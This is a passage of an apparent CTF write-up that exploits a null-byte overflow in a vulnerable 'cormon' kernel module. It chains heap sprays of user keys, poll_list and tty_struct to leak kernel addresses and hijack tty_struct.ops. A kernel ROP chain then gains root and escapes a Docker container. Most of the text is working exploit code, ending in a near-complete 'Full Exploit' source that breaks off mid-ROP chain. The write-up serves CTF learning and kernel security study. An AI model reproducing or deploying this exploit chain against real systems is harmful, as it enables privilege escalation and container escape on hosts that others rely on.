For the time being, I want to leak kheap. Fortunatelly, an object (previously `user_key_payload`, and now `seq_operations`) can be freed and re-allocated as new object, which we can use to leak something again. Okay let's exploit `tty_struct`. When you `open` `/dev/ptmx`, it reaches below path:

```drivers/tty/pty.c
struct tty_file_private {
    struct tty_struct *tty;
    struct file *file;
    struct list_head list;
};

static int ptmx_open(struct inode *inode, struct file *filp)
{
    struct tty_struct *tty;
    int retval;
    ...
    retval = tty_alloc_file(filp);
    ...
    tty = tty_init_dev(ptm_driver, index);
    ...
    tty_add_file(tty, filp);
    ...
}

int tty_alloc_file(struct file *file)
{
    struct tty_file_private *priv;

    priv = kmalloc(sizeof(*priv), GFP_KERNEL);
    file->private_data = priv;
    return 0;
}
void tty_add_file(struct tty_struct *tty, struct file *file)
{
    struct tty_file_private *priv = file->private_data;

    priv->tty = tty;
    priv->file = file;
    ...
}
```

There `tty_alloc_file()` allocate `struct tty_file_private` for `private_data` member of `struct file` of `/dev/ptmx`.
It is allocated in `kmalloc-32`. Then, `tty_init_dev()` allocates `struct tty_struct` from `kmalloc-1024`. And `tty_add_file()` assigns addr of `struct tty_struct` to `struct tty_file_private`. In short, you can leak addr of `kmalloc-1024` by leaking the content of `tty_file_private` in `kmalloc-32`:

```leak_heap.c
  // Free all keys except UAFed key
  for (int ix = 0; ix != NUM_KEY_SPRAY * 2; ++ix) {
    if (keys[ix] != uafed_key) {
      if (keyctl_revoke(keys[ix]) != 0) errExit("keyctl_revoke");
      if (keyctl_unlink(keys[ix], KEY_SPEC_PROCESS_KEYRING) != 0) errExit("keyctl_unlink");
    }
  }

  // Place `tty_file_private` on UAFed `user_key_payload` in kmalloc-32
  for (int ix = 0; ix != NUM_TTY_SPRAY; ++ix) {
    if (open("/dev/ptmx", O_RDWR) <= 2) errExit("open tty");
  }

  // Read `tty_file_private.tty` which points to `tty_struct` in kmalloc-1024
  memset(keybuf, 0, 0x5000);
  if(keyctl_read(uafed_key, keybuf, 0x5000) <= 0) errExit("keyctl_read");
  ulong km1024_leaked = 0;
  ulong *tmp = (ulong*)keybuf + 1;
  for (int ix = 0; ix != 0x4330/8 - 2 - 1; ++ix) {
    if ((tmp[ix] >> (64-4*4)) == 0xFFFF && tmp[ix+2] == tmp[ix+3] && tmp[ix+2] != 0 && (tmp[ix] & 0xFF) == 0x00) { // list_head's next and prev are same
      km1024_leaked = tmp[ix];
      printf("[!] \t+0: 0x%lx (tty)\n", tmp[ix]);
      printf("[!] \t+1: 0x%lx (*file)\n", tmp[ix + 1]);
      printf("[!] \t+2: 0x%lx (list_head.next)\n", tmp[ix + 2]);
      printf("[!] \t+3: 0x%lx (list_head.prev)\n", tmp[ix + 3]);
      break;
    }
  }
  if (km1024_leaked == 0) errExit("Failed to leak kmalloc-1024");
  printf("[!] leaked kmalloc-1024: 0x%lx\n", km1024_leaked);
```

![kheap leak success...?](https://hackmd.io/_uploads/rkVY_pheo.png)

Seems good! But when we check at the addr leaked as `tty`, the first member was not a magic number(`0x5401`), so this is not our target pointer. During many tries, I cloud leak the exact addr of `tty` only once in every 50 tries. What's wrong...
Below is UAFed `user_key_payload` when I free all other keys and sprayed `tty_file_private` in kmalloc-32:
![UAFed user_key_payload in kmalloc-32](https://hackmd.io/_uploads/rJMNzF6gj.png)

The first 32bytes are `user_key_payload`, and there is `seq_operations` on it used to leak kbase. We can leak only `0x4330` bytes of content below `user_key_payload` (this is because `user_key_payload.datalen` is overwritten by 2bytes of `single_next` when we allocated in as UAF).
When we look around there, we can see freed `seq_operations`. `0xa748dc1b1f063d98` would be the encrypted pointer of free slab cache's linked list (we can guess that `CONFIG_SLAB_FREELIST_HARDENED` is enabled). From these things, I guessed that `seq_operations` are unintentionally allocated around the UAFed key due to small number of key spraying. So I just increased the number of keys to spray:

![kmalloc-32 after increasing num of spraying](https://hackmd.io/_uploads/HJpVrFTxs.png)

It might be coincident, but random QWORD(it is encrypted slab pointer) and `0x41414141` (payload of keys) are placed in the same object, so sprayed keys are allocated in next UAFed key, and freed as intended. But it is remained freed unintentionally. So the num of `tty_file_private` spraying is small...? I tried, but failed. So sad...

After 512 years of hard time, I just checked my exploit:

```c
#define NUM_KEY_SPRAY 80 + 10
#define NUM_POLLFD 30 + 510 + 1 // stack, kmalloc-4k, kmalloc-32
#define NUM_POLLLIST_ALLOC 0x10 - 0x1

key_serial_t keys[NUM_KEY_SPRAY * 5] = {0};
for (int ix = 0; ix != NUM_KEY_SPRAY * 2; ++ix) {...}
for (int ix = 0; ix != NUM_KEY_SPRAY * 9; ++ix) {...}
```

**馬鹿！！大馬鹿！おまわりさん、馬鹿はこいつです！捕まえちゃってください！** Macro is no more than a string replacement, so `NUM_KEY_SPRAY * 2` is evaluated as `80 + 10 * 2`!! It must NOT work as I intended!
Okay, I fixed the bug and allocated enough number of `tty_file_private`. The heap right after leaking kbase looks below (all keys are not freed yet. and `seq_operations` is on UAFed key):

![UAFed key is surrounded by many other user_key_payload, seems good...](https://hackmd.io/_uploads/B16mG56gi.png)

You can see UAFed key at the top, and many following it (payload=`AAAAA`). Ideal. But not works... Why... Retrospect the source code around `keyXXX`:

```security/keys/keyring.c
/*
 * Clean up a keyring when it is destroyed.  Unpublish its name if it had one
 * and dispose of its data.
 *
 * The garbage collector detects the final key_put(), removes the keyring from
 * the serial number tree and then does RCU synchronisation before coming here,
 * so we shouldn't need to worry about code poking around here with the RCU
 * readlock held by this time.
 */
static void keyring_destroy(struct key *keyring) {...}
```

**A!! Not `unlink()`, but GC(`security/keys/gc.c`) actually frees keys...!** So what we had to do is just waiting for a second before spraying `tty_file_private`? I tried:

![](https://hackmd.io/_uploads/By7vLqpli.png)
![kheap leak success after waiting GC for a second](https://hackmd.io/_uploads/ByoYLq6gs.png)

Seems good~~~~~~~.

# get RIP by overwriting `tty_struct.ops`

We leaked kheap, so next we wanna get RIP. Ofcourse we can sleep well even if we don't get RIP.
Now, we have UAFed `user_key_payload` (and `tty_file_private` on it) in `kmalloc-32`. By re-utilizing this UAF, let's achieve UAF write. Specifically, when `poll_list` have list of `kmalloc-1024 --> kmalloc-32`, we can overwrite `poll_list` in `kmalloc-32` using the UAF, then we can write the addr of `tty_struct(kmalloc-1024)` to `poll_list.next` pointer. If we free `poll_list`, then victim `tty_struct` can be freed. After achieving UAF of `tty_struct`, we can just overwrite `ops` in `tty_struct`. It should work, I wish...!
So coressponding exploit code is below (fancy ready-made~~)

```.c
  // Free `seq_operations`, one of which is `user_key_payload`
  for (int ix = NUM_SEQOPERATIONS - NUM_FREE_SEQOPERATIONS; ix != NUM_SEQOPERATIONS; ++ix) {
    close(seqops_fd[ix]);
  }
  puts("[+] Freeed seq_operations");
  
  // Spray `poll_list` in kmalloc-32, one of which is placed on `user_key_payload`
  assign_to_core(2);
  neverend = 1;
  puts("[+] spraying `poll_list` in kmalloc-32...");
  num_threads = 0;
  for (int ix = 0; ix != NUM_2ND_POLLLIST_ALLOC; ++ix) {
    struct alloc_poll_list_t *arg = malloc(sizeof(struct alloc_poll_list_t));
    arg->fd = just_fd; arg->id = ix;
    arg->timeout_ms = 3000; // must 1000 < timeout_ms, to wait key GC
    arg->num_size = 30 + 2;
    if(pthread_create(&threads[ix], NULL, alloc_poll_list, arg) != 0) errExit("pthread_create");
  }

  // Revoke UAFed key, which is on `poll_list` in kmalloc-32
  puts("[+] Freeing UAFed key...");
  free_key(uafed_key);
  sleep(1);

  // Spray keys on UAFed `poll_list`
  puts("[+] spraying keys in kmalloc-32");
  assert(num_keys == 0);
  {
    char *key_payload = malloc(SIZE_KEY_TOBE_OVERWRITTEN_SEQOPS);
    memset(key_payload, 'X', SIZE_KEY_TOBE_OVERWRITTEN_SEQOPS);
     _alloc_key_prefill_ulong_val = 0xDEADBEEF;

    for (int ix = 0; ix != NUM_2ND_KEY_SPRAY; ++ix) {
      alloc_key(key_payload, SIZE_KEY_TOBE_OVERWRITTEN_SEQOPS, _alloc_key_prefill_ulong);
    }
  }
```

It writes `0xDEADBEEF` by `setxattr()` before allocating `user_key_payload`s. In this way, `user_key_payload.rcu` get this value, and the value of `poll_list.next` would also become this value:

![Kernel memory overwrite attempt detected to SLUB object](https://hackmd.io/_uploads/rJtEUspgj.png)

??? `Kernel memory overwrite attempt detected to SLUB object 'filp'`, it says. Reading source code, I know that this sentence is shown when `CONFIG_HARDENED_USERCOPY` is enabled:

```mm/usercopy.c
void __noreturn usercopy_abort(const char *name, const char *detail,
			       bool to_user, unsigned long offset,
			       unsigned long len)
{
    pr_emerg("Kernel memory %s attempt detected %s %s%s%s%s (offset %lu, size %lu)!\n",
       to_user ? "exposure" : "overwrite",
       to_user ? "from" : "to",
       name ? : "unknown?!",
       detail ? " '" : "", detail ? : "", detail ? "'" : "",
       offset, len);
    BUG();
}
void __check_heap_object(const void *ptr, unsigned long n, struct page *page, bool to_user)
{
    ...
    usercopy_abort("SLUB object", s->name, to_user, offset, n);
}
```

After several tries, the kernel crashes after detecting overwrites toward `kmalloc-256` cache such as `filp` or `worker_pool`. This is just my guessing: We freed `user_key_payload` right after creating threads to spraying `poll_list`, so `user_key_payload`s are freed before allocating `poll_list` on UAFed object. It ends in double free cuz `seq_operations` on UAFed object is also freed, and heap get corrupted, I guess. So I just `sleep`ed for a while after creating threads, and this error never happend. **Great guessing is, great**.

![DEADBEEF!](https://hackmd.io/_uploads/rkguV20ej.png)

Dead beef, pretty well! Then I removed the dead beef and wrote the addr of `tty_struct` which was used to leak kheap. After this UAF, I sprayed `user_key_payload` of size `0x1000` to fill them with magic number of `tty_struct` (`0x5401`):

![got a RIP](https://hackmd.io/_uploads/HkYg2gybs.png)

Ideal! I overwrite everything including `tty_struct.ops` with `0x5401`, so the kernel crashes as intended! We got RIP.

# get root by kROP on `tty_struct` itself

By `ioctl()`ing to TTY, register values look like below right after the `jmp`:

![register values after jmp-ing to ioctl](https://hackmd.io/_uploads/H1lpKW1Zi.png)

We can control 4byte of `RBX, RCX, RSI` as 2nd argument, and 8byte of `RDX, R8, R12` as 3rd argument.
`RDI`, `RBP`, and `R14` points to `tty_struct` itself. To do stack pivot, we wanna do `push RXX, JMP RYY, ROP RSP` or something, we can't use `RSI` cuz we can only control 4byte of it.
Ladies and Gentlemen, please remember: **`tty_struct` is ideal for kROP**:

```payload.c
    char *key_payload = malloc(0x1000);
    ulong *buf = (ulong*)key_payload;
    buf[0] = 0x5401; // magic, kref (later `leave`ed and become RBP)
    buf[1] = KADDR(0xffffffff8191515a); // dev (later become ret addr of `leave` gadget, which is `pop rsp`)
    buf[2] = km1024_leaked + 0x50 + 0x120; // driver (MUST BE VALID) (later `pop rsp`ed)
    buf[3] = km1024_leaked + 0x50; // ops

    ulong *ops = (ulong*)(key_payload + 0x50);
    for (int ix = 0; ix != 0x120 / 8; ++ix) { // sizeof tty_operations
      ops[ix] = KADDR(0xffffffff81577609); // pop rsp
    }

    ulong *rop = (ulong*)((char*)ops + 0x120);
    *rop++ = ...

    assert((ulong)rop - (ulong)key_payload < 516);
```

First, we overwrite `ops` to make it point to `tty_struct + 0x50`. We spray the addr of `leave` gadget as a fake vtable around there. Then, `leave` pops addr of `tty_struct` into `RSP` because `RBP` has the value of `tty_struct` itself.
After that, `RET` would returns to the addr in `tty_struct + 8`. Here is `tty_struct.dev` pointer, and this pointer is allowed to be broken. So you can just put the addr `tty_struct + 0x50 + 0x120`. Finally, you can construct your ROP chain at `tty_struct + 0x50 + 0x120` as you like.
This structure is just for kROP. Miraculously, this kROP can work without corrupting magic number and pointers which must be kept clean (such as `+0x10: driver`). Great structure, really.

[EDIT] If you want to know the details of this kROP technique, you can reffer to [my GitHub](https://github.com/smallkirby/kernelpwn/blob/master/technique/tty_struct.md), where I describe it more deeply.

[EDIT] I realized there is useful gadget in kernel: `0xffffffff813a478a: push rdx; mov ebp, 0x415bffd9; pop rsp; pop r13; pop rbp; ret;`. It is equivalent to `mov rsp, rdx`. As stated above, `RDX` can be fully controlled by 3rd argument of `ioctl()`. So it might be the case that you don't have to do this *2 phased kROP*. But I still love this kROP, it is wonderful :)

ROP would look like below:

```rop.c
  *rop++ = KADDR(0xffffffff81906510); // pop rdi
  *rop++ = 0;
  *rop++ = KADDR(0xffffffff810ebc90); // prepare_kernel_cred

  *rop++ = KADDR(0xffffffff812c32a9); // pop rcx (to prevent later `rep`)
  *rop ++ = 0;
  *rop++ = KADDR(0xffffffff81a05e4b); // mov rdi, rax; rep movsq; (simple `mov rdi, rax` not found)
  *rop++ = KADDR(0xffffffff810eba40); // commit_creds

  *rop++ = KADDR(0xffffffff81c00ef0 + 0x16); // swapgs_restore_regs_and_return_to_usermode + 0x16
                                             // mov rdi,rsp; mov rsp,QWORD PTR gs:0x6004; push QWORD PTR [rdi+0x30]; ...
  *rop++ = 0;
  *rop++ = 0;
  *rop++ = (ulong)NIRUGIRI;
  *rop++ = user_cs;
  *rop++ = user_rflags;
  *rop++ = (ulong)krop_stack + KROP_USTACK_SIZE / 2;
  *rop++ = user_ss;
```

![got a ROOT](https://hackmd.io/_uploads/SJj9iMy-j.png)

ROOT!

# container escape

We have not finished all yet. We a still in a container, and have to escape from it. Actually, I have no knowledge from here. Yes, just cheat. I start just copying from now on. Meaningfull copying. Stupid copying.
Although, there are no hard things if we have a root. `setns()` syscall is restricted in a docker container, we just move to only other filesystem namespace. Like below:

```abst.c
// To get a root...?
commit_cred(prepare_kernel_cred(0));

// To escape from container(fs)...?
switch_task_namespaces(find_task_vpid(1), init_nsproxy);
current->fs = copy_fs_struct(init_fs);
```

That's it! yatta~~~~~

```rop.c
  *rop++ = KADDR(0xffffffff81906510); // pop rdi
  *rop++ = 1; // init process in docker container
  *rop++ = KADDR(0xffffffff810e4fc0); // find_task_by_vpid
  *rop++ = KADDR(0xffffffff812c32a9); // pop rcx (to prevent later `rep`)
  *rop ++ = 0;
  *rop++ = KADDR(0xffffffff81a05e4b); // mov rdi, rax; rep movsq; (simple `mov rdi, rax` not found)
  *rop++ = KADDR(0xffffffff819b21d3); // pop rsi
  *rop++ = KADDR(0xffffffff8245a720); // &init_nsproxy
  *rop++ = KADDR(0xffffffff810ea4e0); // switch_task_namespaces

  *rop++ = KADDR(0xffffffff81906510); // pop rdi
  *rop++ = KADDR(0xffffffff82589740); // &init_fs
  *rop++ = KADDR(0xffffffff812e7350); // copy_fs_struct
  *rop++ = KADDR(0xffffffff8131dab0); // push rax; pop rbx

  *rop++ = KADDR(0xffffffff81906510); // pop rdi
  *rop++ = getpid();
  *rop++ = KADDR(0xffffffff810e4fc0); // find_task_by_vpid

  *rop++ = KADDR(0xffffffff8117668f); // pop rdx
  *rop++ = 0x6E0;
  *rop++ = KADDR(0xffffffff81029e7d); // add rax, rdx
  *rop++ = KADDR(0xffffffff817e1d6d); // mov qword [rax], rbx ; pop rbx ; ret ; (1 found)
  *rop++ = 0; // trash
```


# アウトロ

![uouo fish life](https://hackmd.io/_uploads/B1iKq7JZi.gif)


UOUO FISH LIFE.

# Full Exploit

```exploit.c
#include "./exploit.h"
#include <bits/pthreadtypes.h>
#include <keyutils.h>
#include <pthread.h>
#include <sys/mman.h>
#include <unistd.h>

/*********** commands ******************/
#define DEV_PATH "/proc_rw/cormon"   // the path the device is placed

/*********** constants ******************/
#define DESC_KEY_TOBE_OVERWRITTEN_SEQOPS "exploit0"
#define SIZE_KEY_TOBE_OVERWRITTEN_SEQOPS 0x8
#define NUM_KEY_SPRAY (0x60)
#define NUM_2ND_KEY_SPRAY (NUM_KEY_SPRAY * 2)
#define NUM_3RD_KEY_SPRAY (0x10 + 0x8)
#define NUM_3RD_KEY_SIZE (0x290)

#define NUM_PREPARE_KM32_SPRAY 2000

#define NUM_POLLFD (30 + 510 + 1) // stack, kmalloc-4k, kmalloc-32
#define NUM_1ST_POLLLIST_ALLOC (0x10 - 0x1 + 0x1)
#define NUM_2ND_POLLLIST_ALLOC (0x120 + 0x20 + 0x40 + 0x40 + 0x40 + 0x200)
#define TIMEOUT_POLLFD 2000 // 2s

#define NUM_TTY_SPRAY (0x100)

#define NUM_SEQOPERATIONS (NUM_1ST_POLLLIST_ALLOC + 0x100)
#define NUM_FREE_SEQOPERATIONS (0x160)

#define KADDR(addr) ((ulong)addr - 0xffffffff81000000 + kbase)

/*********** globals ******************/

int cormon_fd;
int just_fd;
key_serial_t keys[NUM_KEY_SPRAY * 5] = {0};
int seqops_fd[0x500];
int tty_fd[NUM_TTY_SPRAY * 2];
char *cormon_buf[0x1000 + 0x20] = {0};
pthread_t threads[0x1000];
int num_threads = 0;
pthread_mutex_t mutex = PTHREAD_MUTEX_INITIALIZER;

ulong kbase = 0;
int neverend = 0;

char *krop_stack = NULL;
#define KROP_USTACK_SIZE 0x10000

/*********** utils ******************/

int num_keys = 0;
ulong _alloc_key_prefill_ulong_val = 0;
void _alloc_key_prefill_ulong() {
  static char *data = NULL;
  if (data == NULL) data = calloc(0x1000, 1);
  //for (int ix = 0; ix != 32 / 8; ++ix) ((ulong*)data)[ix] = _alloc_key_prefill_ulong_val;
  ((ulong*)data)[0] = _alloc_key_prefill_ulong_val;
  setxattr("/home/user/.bashrc", "user.x", data, 32, XATTR_CREATE);
}
void _alloc_key_prefill_null(void) {
  _alloc_key_prefill_ulong_val = 0;
  _alloc_key_prefill_ulong();
}
void alloc_key(char *payload, int size, void (*prefill)(void)) {
  static char *desc = NULL;
  if (desc == NULL) desc = calloc(1, 0x1000);

  sprintf(desc, "key_%d", num_keys);
  if (prefill != NULL) prefill();
  keys[num_keys] = add_key("user", desc, payload, size, KEY_SPEC_PROCESS_KEYRING);
  if (keys[num_keys] < 0) errExit("alloc_key");
  num_keys++;
}
void spray_keys(int num, char c) {
  static char *payload = NULL;
  if (payload == NULL) payload = calloc(1, 0x1000);
  char *key_payload = malloc(SIZE_KEY_TOBE_OVERWRITTEN_SEQOPS);
  memset(key_payload, c, SIZE_KEY_TOBE_OVERWRITTEN_SEQOPS);

  for (int ix = 0; ix != num; ++ix) alloc_key(key_payload, SIZE_KEY_TOBE_OVERWRITTEN_SEQOPS, _alloc_key_prefill_null);
}
void free_key(key_serial_t key) {
  if (keyctl_revoke(key) != 0) errExit("keyctl_revoke");
  if (keyctl_unlink(key, KEY_SPEC_PROCESS_KEYRING) != 0) errExit("keyctl_unlink");
  --num_keys;
}

struct alloc_poll_list_t {
  int fd;
  int id;
  int num_size;
  int timeout_ms;
};
void* alloc_poll_list(void *_arg) {
  struct pollfd fds[NUM_POLLFD];
  struct alloc_poll_list_t *arg = (struct alloc_poll_list_t *)_arg;
  assert(arg->fd >= 2);

  for (int ix = 0; ix != arg->num_size; ++ix) {
    fds[ix].fd = arg->fd;
    fds[ix].events = POLLERR;
  }
  pthread_mutex_lock(&mutex);
    ++num_threads;
  pthread_mutex_unlock(&mutex);

  thread_assign_to_core(0);
  if (poll(fds, arg->num_size, arg->timeout_ms) != 0) errExit("poll");

  pthread_mutex_lock(&mutex);
    --num_threads;
  pthread_mutex_unlock(&mutex);

  if (neverend) {
    thread_assign_to_core(2);
    while(neverend);
  }

  return NULL;
}

void nullbyte_overflow(void) {
  assert(cormon_fd >= 2);
  memset(cormon_buf, 'B', 0x1000 + 0x20);
  strcpy((char*)cormon_buf + 1, "THIS_IS_CORMON_BUFFER");
  *cormon_buf = 0x00;

  if(write(cormon_fd, cormon_buf, 0x1000) != -1) errExit("nullbyte_overflow");
  errno = 0; // `write()` above must fail, so clear errno here
}

/*********** main ******************/

int main(int argc, char *argv[]) {
  char *keybuf = malloc(0x5000); // must be >= 0x4330 (low 2byte of single_next())
  puts("[.] Starting exploit.");

  puts("[+] preparing stack for later kROP...");
  save_state();
  krop_stack = mmap((void*)0x10000000, KROP_USTACK_SIZE, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS | MAP_FIXED, -1, 0);
  if (krop_stack == MAP_FAILED) errExit("mmap");

  assign_to_core(0);
  if ((cormon_fd = open(DEV_PATH, O_RDWR)) <= 2) errExit("open cormon");

  // Pre-spray kmalloc-32
  puts("[+] pre-spraying kmalloc-32...");
  for (int ix = 0; ix != NUM_PREPARE_KM32_SPRAY; ++ix) {
    if (open("/proc/self/stat", O_RDONLY) <= 2) errExit("prespray");
  }

  // Spray victim `user_key_payload` in kmalloc-32
  puts("[+] Spraying keys...");
  spray_keys(NUM_KEY_SPRAY, 'A');

  // Spray poll_list in kmalloc-32 and kmalloc-4k
  just_fd = open("/etc/hosts", O_RDONLY);
  printf("[+] Spraying poll_list (fd=%d)...\n", just_fd);
  if (just_fd <= 2) errExit("just_fd");

  assign_to_core(1);
  num_threads = 0;
  for (int ix = 0; ix != NUM_1ST_POLLLIST_ALLOC + 3; ++ix) {
    struct alloc_poll_list_t *arg = malloc(sizeof(struct alloc_poll_list_t));
    arg->fd = just_fd; arg->id = ix;
    arg->timeout_ms = ix < NUM_1ST_POLLLIST_ALLOC ? TIMEOUT_POLLFD : 1;;
    arg->num_size = NUM_POLLFD;
    if(pthread_create(&threads[ix], NULL, alloc_poll_list, arg) != 0) errExit("pthread_create");
  }

  // Wait some of `poll_list` in kmalloc-4k is freed (these are expected to be reused by cormon_proc_write())
  assign_to_core(0);
  usleep(500 * 1000); // wait threads are initialized
  for(int ix = NUM_1ST_POLLLIST_ALLOC; ix < NUM_1ST_POLLLIST_ALLOC + 3; ++ix) {
    pthread_join(threads[ix], NULL);
  }

  // Spray again victim `user_key_payload` in kmalloc-32
  spray_keys(NUM_KEY_SPRAY, 'A');

  // NULL-byte overflow (hopelly) on `poll_list`, whose `next` pointer get pointing to `user_key_payload` in kmalloc-32.
  puts("[+] NULL-byte overflow ing...");
  nullbyte_overflow();

  // Wait all `poll_list` are freed
  for (int ix = 0; ix != NUM_1ST_POLLLIST_ALLOC; ++ix) {
    open("/proc/self/stat", O_RDONLY);
    pthread_join(threads[ix], NULL);
  }
  puts("[+] Freed all 'poll_list'");

  // Place `seq_operations` on UAFed `user_key_payload` in kmalloc-32
  for(int ix = 0; ix != NUM_SEQOPERATIONS; ++ix) {
    if ((seqops_fd[ix] = open("/proc/self/stat", O_RDONLY)) <= 2) errExit("open seqops");
  }

  // Check all keys to leak kbase via `seq_operations`
  ulong single_show = 0;
  key_serial_t uafed_key = 0;
  for (int ix = 0; ix != NUM_KEY_SPRAY * 2; ++ix) {
    int num_read;
    memset(keybuf, 0, 0x5000);
    if((num_read = keyctl_read(keys[ix], keybuf, 0x5000)) <= 0) errExit("keyctl_read");
    if (strncmp(keybuf, "AAAA", 4) != 0) {
      single_show = *(ulong*)keybuf;
      uafed_key = keys[ix];
      if (single_show == 0) {
        puts("[-] somehow, empty key found");
      } else break;
    }
  }
  if (single_show == 0) {
    puts("[-] Failed to leak kbase");
    exit(1);
  }
  printf("[!] leaked single_show: 0x%lx\n", single_show);
  kbase = single_show - (0xffffffff813275c0 - 0xffffffff81000000);
  printf("[!] leaked kbase: 0x%lx\n", kbase);

  // Free all keys except UAFed key
  for (int ix = 0; ix != NUM_KEY_SPRAY * 2; ++ix) {
    if (keys[ix] != uafed_key) free_key(keys[ix]);
  }
  sleep(1); // wait GC(security/keys/gc.c) actually frees keys

  // Place `tty_file_private` on UAFed `user_key_payload` in kmalloc-32
  for (int ix = 0; ix != NUM_TTY_SPRAY; ++ix) {
    if ((tty_fd[ix] = open("/dev/ptmx", O_RDWR | O_NOCTTY)) <= 2) errExit("open tty");
  }

  // Read `tty_file_private.tty` which points to `tty_struct` in kmalloc-1024
  memset(keybuf, 0, 0x5000);
  int num_read = 0;
  if((num_read = keyctl_read(uafed_key, keybuf, 0x5000)) <= 0) errExit("keyctl_read");
  printf("[+] read 0x%x bytes from UAFed key\n", num_read);
  ulong km1024_leaked = 0;
  ulong *tmp = (ulong*)keybuf + 1;
  for (int ix = 0; ix != 0x4330/8 - 2 - 1; ++ix) {
    if (
      (tmp[ix] >> (64-4*4)) == 0xFFFF && // tty must be in kheap
      (tmp[ix + 1] >> (64-4*4)) == 0xFFFF && // file must be in kheap
      tmp[ix+2] == tmp[ix+3] && tmp[ix+2] != 0 && // list_head's next and prev are same
      (tmp[ix] & 0xFF) == 0x00 && // tty must be 0x100 aligned
      (tmp[ix + 1] & 0xFF) == 0x00 && // file must be 0x100 aligned
      (tmp[ix + 2] & 0xF) == 0x08
    ) {
      if (km1024_leaked == 0) {
        km1024_leaked = tmp[ix];
        printf("[!] \t+0: 0x%lx (tty)\n", tmp[ix]);
        printf("[!] \t+1: 0x%lx (*file)\n", tmp[ix + 1]);
        printf("[!] \t+2: 0x%lx (list_head.next)\n", tmp[ix + 2]);
        printf("[!] \t+3: 0x%lx (list_head.prev)\n", tmp[ix + 3]);
        break;
      }
    }
  }
  if (km1024_leaked == 0) {
    print_curious(keybuf, 0x4300, 0);
    errExit("Failed to leak kmalloc-1024");
  }
  printf("[!] leaked kmalloc-1024: 0x%lx\n", km1024_leaked);

  /********************************************************/

  // Free `seq_operations`, one of which is `user_key_payload`
  for (int ix = NUM_SEQOPERATIONS - NUM_FREE_SEQOPERATIONS; ix != NUM_SEQOPERATIONS; ++ix) {
    close(seqops_fd[ix]);
  }
  puts("[+] Freeed seq_operations");

  sleep(5); // TODO
  // Spray `poll_list` in kmalloc-32, one of which is placed on `user_key_payload`
  assign_to_core(2);
  neverend = 1;
  puts("[+] spraying `poll_list` in kmalloc-32...");
  num_threads = 0;
  for (int ix = 0; ix != NUM_2ND_POLLLIST_ALLOC; ++ix) {
    struct alloc_poll_list_t *arg = malloc(sizeof(struct alloc_poll_list_t));
    arg->fd = just_fd; arg->id = ix;
    arg->timeout_ms = 3000; // must 1000 < timeout_ms, to wait key GC
    arg->num_size = 30 + 2;
    if(pthread_create(&threads[ix], NULL, alloc_poll_list, arg) != 0) errExit("pthread_create");
  }
  // wait threads are initialized (to prevent double free)
  assign_to_core(0);
  while(num_threads != NUM_2ND_POLLLIST_ALLOC);
  usleep(300 * 1000);

  // Revoke UAFed key, which is on `poll_list` in kmalloc-32
  puts("[+] Freeing UAFed key...");
  free_key(uafed_key);
  sleep(1);

  // Spray keys on UAFed `poll_list`
  puts("[+] spraying keys in kmalloc-32");
  assert(num_keys == 0);
  {
    char *key_payload = malloc(SIZE_KEY_TOBE_OVERWRITTEN_SEQOPS);
    memset(key_payload, 'X', SIZE_KEY_TOBE_OVERWRITTEN_SEQOPS);
    ((ulong*)key_payload)[0] = 0x9999999999999999; // debug
     _alloc_key_prefill_ulong_val = km1024_leaked - 0x18; // 0x18 is offset where `user_key_payload` can modify from

    for (int ix = 0; ix != NUM_2ND_KEY_SPRAY; ++ix) {
      alloc_key(key_payload, SIZE_KEY_TOBE_OVERWRITTEN_SEQOPS, _alloc_key_prefill_ulong);
    }
  }

  puts("[+] waiting corrupted `poll_list` is freed...");
  neverend = 0;
  for(int ix = 0; ix != NUM_2ND_POLLLIST_ALLOC; ++ix) {
    pthread_join(threads[ix], NULL);
  }

  // Free all keys
  for (int ix = 0; ix != NUM_2ND_KEY_SPRAY; ++ix) {
    free_key(keys[ix]);
  }
  puts("[+] waiting all keys are freed by GC...");
  sleep(1); // wait GC(security/keys/gc.c) actually frees keys

  // Spray keys in `kmalloc-1024`, one of which must be placed on `tty_struct`
  puts("[+] spraying keys in kmalloc-1024");
  assert(num_keys == 0);
  {
    char *key_payload = malloc(0x1000);
    ulong *buf = (ulong*)key_payload;
    buf[0] = 0x5401; // magic, kref (later `leave`ed and become RBP)
    buf[1] = KADDR(0xffffffff8191515a); // dev (later become ret addr of `leave` gadget, which is `pop rsp`)
    buf[2] = km1024_leaked + 0x50 + 0x120; // driver (MUST BE VALID) (later `pop rsp`ed)
    buf[3] = km1024_leaked + 0x50; // ops

    ulong *ops = (ulong*)(key_payload + 0x50);
    for (int ix = 0; ix != 0x120 / 8; ++ix) { // sizeof tty_operations
      ops[ix] = KADDR(0xffffffff81577609); // pop rsp
    }

    ulong *rop = (ulong*)((char*)ops + 0x120);
    *rop++ = KADDR(0xffffffff81906510); // pop rdi
    *rop++ = 0;
    *rop++ = KADDR(0xffffffff810ebc90); // prepare_kernel_cred

    *rop++ = KADDR(0xffffffff812c32a9); // pop rcx (to prevent later `rep`)
    *rop ++ = 0;
    *rop++ = KADDR(0xffffffff81a05e4b); // mov rdi, rax; rep movsq; (simple `mov rdi, rax` not found)
    *rop++ = KADDR(0xffffffff810eba40); // commit_creds

    *rop++ = KADDR(0xffffffff81906510); // pop rdi
    *rop++ = 1; // init process in docker container
    *rop++ = KADDR(0xffffffff810e4fc0); // find_task_by_vpid
    *rop++ = KADDR(0xffffffff812c32a9); // pop rcx (to prevent later `rep`)
    *rop ++ = 0;
    *rop++ = KADDR(0xffffffff81a05e4b); // mov rdi, rax; rep movsq; (simple `mov rdi, rax` not found)
    *rop++ = KADDR(0xffffffff819b21d3); // pop rsi
    *rop++ = KADDR(0xffffffff8245a720); // &init_nsproxy
    *rop++ = KADDR(0xffffffff810ea4e0); // switch_task_namespaces

    *rop++ = KADDR(0xffffffff81906510); // pop rdi
    *rop++ = KADDR(0xffffffff82589740); // &init_fs
    *rop++ = KADDR(0xffffffff812e7350); // copy_fs_struct
    *rop++ = KADDR(0xffffffff8131dab0); // push rax; pop rbx

    *rop++ = KADDR(0xffffffff81906510); // pop rdi
    *rop++ = getpid();
    *rop++ = KADDR(0xffffffff810e4fc0); // find_task_by_vpid

    *rop++ = KADDR(0xffffffff8117668f); // pop rdx
    *rop++ = 0x6E0;
    *rop++ = KADDR(0xffffffff81029e7d); // add rax, rdx
    *rop++ = KADDR(0xffffffff817e1d6d); // mov qword [rax], rbx ; pop rbx ; ret ; (1 found)
    *rop++ = 0; // trash


    *rop++ = KADDR(0xffffffff81c00ef0 + 0x16); // swapgs_restore_regs_and_return_to_usermode + 0x16
